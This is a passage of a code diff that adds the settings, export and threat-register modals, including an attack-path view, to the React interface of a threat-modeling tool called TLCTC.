+                    <input value={projectMeta.name} onChange={(e) => setProjectMeta({...projectMeta, name: e.target.value})} className={`w-full ${darkMode ? 'bg-slate-700 border-slate-600' : 'bg-slate-100 border-slate-300'} border rounded px-3 py-2`} /></div>
+                  <div className="grid grid-cols-2 gap-3">
+                    <div><label className={`block text-sm ${darkMode ? 'text-slate-400' : 'text-slate-500'} mb-1`}>Version</label>
+                      <input value={projectMeta.version} onChange={(e) => setProjectMeta({...projectMeta, version: e.target.value})} className={`w-full ${darkMode ? 'bg-slate-700 border-slate-600' : 'bg-slate-100 border-slate-300'} border rounded px-3 py-2`} /></div>
+                    <div><label className={`block text-sm ${darkMode ? 'text-slate-400' : 'text-slate-500'} mb-1`}>SDLC Phase</label>
+                      <select value={projectMeta.sdlcPhase} onChange={(e) => setProjectMeta({...projectMeta, sdlcPhase: e.target.value})} className={`w-full ${darkMode ? 'bg-slate-700 border-slate-600' : 'bg-slate-100 border-slate-300'} border rounded px-3 py-2`}>
+                        <option>Requirements</option><option>Design</option><option>Development</option><option>Testing</option><option>Deployment</option><option>Maintenance</option>
+                      </select></div>
+                  </div>
+                  <div><label className={`block text-sm ${darkMode ? 'text-slate-400' : 'text-slate-500'} mb-1`}>Author</label>
+                    <input value={projectMeta.author} onChange={(e) => setProjectMeta({...projectMeta, author: e.target.value})} className={`w-full ${darkMode ? 'bg-slate-700 border-slate-600' : 'bg-slate-100 border-slate-300'} border rounded px-3 py-2`} /></div>
+                </div>
+                <div className="flex justify-end mt-4"><button onClick={() => setShowSettings(false)} className={`px-4 py-2 ${darkMode ? 'bg-slate-700' : 'bg-slate-200'} rounded`}>Close</button></div>
+              </div>
+            </div>
+          )}
+
+          {/* Export Modal */}
+          {showExport && (
+            <div className={`fixed inset-0 ${darkMode ? 'bg-black/60' : 'bg-black/40'} flex items-center justify-center z-50`} onClick={() => setShowExport(false)}>
+              <div className={`${darkMode ? 'bg-slate-800' : 'bg-white'} rounded-xl w-full max-w-md p-6 m-4 shadow-xl`} onClick={e => e.stopPropagation()}>
+                <h2 className="text-lg font-bold mb-4">Export Threat Model</h2>
+                <button onClick={exportJSON} className={`w-full flex items-center gap-3 p-4 ${darkMode ? 'bg-slate-700 hover:bg-slate-600' : 'bg-slate-100 hover:bg-slate-200'} rounded-lg mb-2`}>
+                  <span className="text-amber-500"><Icons.FileJson /></span>
+                  <div className="text-left"><div className="font-medium">TLCTC JSON</div><div className="text-sm text-slate-400">Full data for import/automation</div></div>
+                </button>
+                <button onClick={exportPNG} className={`w-full flex items-center gap-3 p-4 ${darkMode ? 'bg-slate-700 hover:bg-slate-600' : 'bg-slate-100 hover:bg-slate-200'} rounded-lg mb-2`}>
+                  <span className="text-blue-500"><Icons.Image /></span>
+                  <div className="text-left"><div className="font-medium">PNG Image (2x)</div><div className="text-sm text-slate-400">High-res raster for reports</div></div>
+                </button>
+                <button onClick={exportSVG} className={`w-full flex items-center gap-3 p-4 ${darkMode ? 'bg-slate-700 hover:bg-slate-600' : 'bg-slate-100 hover:bg-slate-200'} rounded-lg mb-2`}>
+                  <span className="text-green-500"><Icons.Image /></span>
+                  <div className="text-left"><div className="font-medium">SVG Vector</div><div className="text-sm text-slate-400">Scalable for editing/printing</div></div>
+                </button>
+                <div className={`p-3 ${darkMode ? 'bg-slate-700/50 text-slate-400' : 'bg-slate-100 text-slate-500'} rounded text-xs mt-2`}>
+                  {groups.length} groups · {components.length} components · {interfaces.length} interfaces
+                </div>
+                <div className="flex justify-end mt-4"><button onClick={() => setShowExport(false)} className={`px-4 py-2 ${darkMode ? 'bg-slate-700' : 'bg-slate-200'} rounded`}>Cancel</button></div>
+              </div>
+            </div>
+          )}
+
+          {/* Threat Register Modal — with Attack Paths tab */}
+          {showThreatRegister && (
+            <div className={`fixed inset-0 ${darkMode ? 'bg-black/60' : 'bg-black/40'} flex items-center justify-center z-50 p-4`} onClick={() => setShowThreatRegister(false)}>
+              <div className={`${darkMode ? 'bg-slate-800 text-slate-100' : 'bg-white text-slate-900'} rounded-xl w-full max-w-6xl max-h-[90vh] flex flex-col shadow-xl`} onClick={e => e.stopPropagation()}>
+                <div className={`p-4 border-b ${darkMode ? 'border-slate-700' : 'border-slate-200'} flex items-center gap-4 flex-shrink-0`}>
+                  <button onClick={() => setRegisterTab('threats')}
+                    className={`text-sm font-medium px-3 py-1 rounded ${registerTab === 'threats' ? 'bg-amber-600 text-white' : (darkMode ? 'text-slate-400 hover:text-white' : 'text-slate-500 hover:text-slate-900')}`}>
+                    Threat Register
+                  </button>
+                  <button onClick={() => setRegisterTab('paths')}
+                    className={`text-sm font-medium px-3 py-1 rounded flex items-center gap-1 ${registerTab === 'paths' ? 'bg-red-600 text-white' : (darkMode ? 'text-slate-400 hover:text-white' : 'text-slate-500 hover:text-slate-900')}`}>
+                    Attack Paths
+                    <span className="text-xs bg-black/30 px-1.5 rounded">{detectAttackPaths(interfaces, components).length}</span>
+                  </button>
+                  <div className="flex-1" />
+                  <button onClick={() => setShowThreatRegister(false)} className={`p-2 ${darkMode ? 'hover:bg-slate-700' : 'hover:bg-slate-200'} rounded`}><Icons.X /></button>
+                </div>
+
+                {/* Tab: Threat Register */}
+                {registerTab === 'threats' && (
+                  <div className="flex-1 overflow-auto p-4">
+                    {generateThreatRegister().length === 0 ? (
+                      <div className="text-center text-slate-400 py-12">No threats identified. Add threats to components or interfaces.</div>
+                    ) : (
+                      <table className="w-full text-sm">
+                        <thead className={`${darkMode ? 'bg-slate-700/50' : 'bg-slate-100'} sticky top-0`}>
+                          <tr>
+                            <th className="text-left p-2">Element</th>
+                            <th className="text-left p-2">Type</th>
+                            <th className="text-left p-2">Cluster</th>
+                            <th className="text-left p-2">Status</th>
+                            <th className="text-left p-2">VC</th>
+                            <th className="text-left p-2">Risk</th>
+                            <th className="text-left p-2">Notes</th>
+                            <th className="text-left p-2">Control</th>
+                          </tr>
+                        </thead>
+                        <tbody className={`divide-y ${darkMode ? 'divide-slate-700' : 'divide-slate-200'}`}>
+                          {generateThreatRegister().map((item, idx) => {
+                            const cluster = TLCTC_CLUSTERS[item.cluster];
+                            const isComponent = item.elementType === 'component';
+                            return (
+                              <tr key={idx} className={`${darkMode ? 'hover:bg-slate-700/30' : 'hover:bg-slate-50'}`}>
+                                <td className="p-2">
+                                  <div className="font-medium">{isComponent ? item.componentName : item.interfaceName}</div>
+                                  <div className="text-xs text-slate-500">
+                                    {isComponent ? (item.group || 'Ungrouped') : `${item.fromGroup || '-'} → ${item.toGroup || '-'}`}
+                                  </div>
+                                </td>
+                                <td className="p-2">
+                                  <span className={`px-1.5 py-0.5 rounded text-xs ${isComponent ? (darkMode ? 'bg-purple-900/50 text-purple-300' : 'bg-purple-100 text-purple-700') : item.isNetworkInterface ? (darkMode ? 'bg-blue-900/50 text-blue-300' : 'bg-blue-100 text-blue-700') : (darkMode ? 'bg-slate-700' : 'bg-slate-200')}`}>
+                                    {isComponent ? 'Component' : item.interfaceType}
+                                  </span>
+                                </td>
+                                <td className="p-2"><span className="font-mono font-bold" style={{ color: cluster?.color }}>{item.cluster}</span> <span className="text-xs text-slate-400">{cluster?.shortName}</span></td>
+                                <td className="p-2"><span className={`px-1.5 py-0.5 rounded text-xs ${item.status === 'Mitigated' ? (darkMode ? 'bg-green-900/50 text-green-300' : 'bg-green-100 text-green-700') : item.status === 'Accepted' ? (darkMode ? 'bg-blue-900/50 text-blue-300' : 'bg-blue-100 text-blue-700') : (darkMode ? 'bg-amber-900/50 text-amber-300' : 'bg-amber-100 text-amber-700')}`}>{item.status}</span></td>
+                                <td className="p-2" style={{ color: VELOCITY_CLASSES[item.velocityClass]?.color }}>{item.velocityClass}</td>
+                                <td className="p-2"><span className={`px-1.5 py-0.5 rounded text-xs ${item.residualRisk === 'Critical' ? (darkMode ? 'bg-red-900/50 text-red-300' : 'bg-red-100 text-red-700') : item.residualRisk === 'High' ? (darkMode ? 'bg-orange-900/50 text-orange-300' : 'bg-orange-100 text-orange-700') : item.residualRisk === 'Medium' ? (darkMode ? 'bg-yellow-900/50 text-yellow-300' : 'bg-yellow-100 text-yellow-700') : (darkMode ? 'bg-green-900/50 text-green-300' : 'bg-green-100 text-green-700')}`}>{item.residualRisk}</span></td>
+                                <td className="p-2 text-xs text-slate-400 max-w-xs truncate">{item.notes || '-'}</td>
+                                <td className="p-2 text-xs">
+                                  {item.controlRef ? (
+                                    <a href={item.controlRef} target="_blank" rel="noopener noreferrer" className="text-green-400 hover:text-green-300 underline flex items-center gap-1">
+                                      <Icons.Link /> Doc
+                                    </a>
+                                  ) : item.status === 'Mitigated' ? <span className="text-slate-500">Missing</span> : '-'}
+                                </td>
+                              </tr>
+                            );
+                          })}
+                        </tbody>
+                      </table>
+                    )}
+                  </div>
+                )}
+
+                {/* Tab: Attack Paths */}
+                {registerTab === 'paths' && (
+                  <div className="flex-1 overflow-auto p-4">
+                    {(() => {
+                      const allPaths = detectAttackPaths(interfaces, components);
+                      if (allPaths.length === 0) return (
+                        <div className="text-center text-slate-400 py-12">No attack paths detected. Connect components via interfaces to see attack chain analysis.</div>
+                      );
+                      return (
+                        <div className="grid gap-3 md:grid-cols-2">
+                          {allPaths.map((path, idx) => (
+                            <div key={idx} className={`p-4 rounded-lg border ${darkMode ? 'border-red-800/30 bg-red-900/10 hover:bg-red-900/15' : 'border-red-200 bg-red-50 hover:bg-red-100'} transition-colors`}>
+                              <div className="font-medium text-red-300 text-sm">{path.name}</div>
+                              <div className="text-xs text-slate-500 mt-0.5">{path.fromName} → {path.toName}</div>
+                              <div className="flex items-center gap-1.5 mt-2 flex-wrap">
+                                {path.chain.map((step, j) => (
+                                  <React.Fragment key={j}>
+                                    <span className="px-2 py-0.5 rounded text-xs font-mono font-bold"
+                                      style={{ backgroundColor: `${TLCTC_CLUSTERS[step]?.color}25`, color: TLCTC_CLUSTERS[step]?.color, border: `1px solid ${TLCTC_CLUSTERS[step]?.color}40` }}>
+                                      {step} {TLCTC_CLUSTERS[step]?.shortName}
+                                    </span>
+                                    {j < path.chain.length - 1 && <span className="text-slate-600">→</span>}
+                                  </React.Fragment>
+                                ))}
+                              </div>
+                              <p className="text-xs text-slate-400 mt-2 leading-relaxed">{path.desc}</p>
+                              <p className="text-xs text-slate-500 mt-1 italic leading-relaxed">{path.example}</p>
+                            </div>
+                          ))}
+                        </div>
+                      );
+                    })()}
+                  </div>
+                )}
+
+                <div className={`p-4 border-t ${darkMode ? 'border-slate-700' : 'border-slate-200'} flex justify-between items-center flex-shrink-0`}>
+                  <div className="text-sm text-slate-400">
+                    {registerTab === 'threats' ? `${generateThreatRegister().length} threats` : `${detectAttackPaths(interfaces, components).length} attack paths detected`}
+                  </div>
+                  <button onClick={exportJSON} className="flex items-center gap-2 px-4 py-2 bg-amber-600 hover:bg-amber-500 rounded text-sm font-medium">
+                    <Icons.Download /> Export JSON
+                  </button>
+                </div>
+              </div>
+            </div>
+          )}
+        </div>
+      );
+    }
+
+    // Render
+    const root = ReactDOM.createRoot(document.getElementById('root'));
+    root.render(<TLCTCThreatIdentificationTool />);
+  </script>
+</body>
+</html>
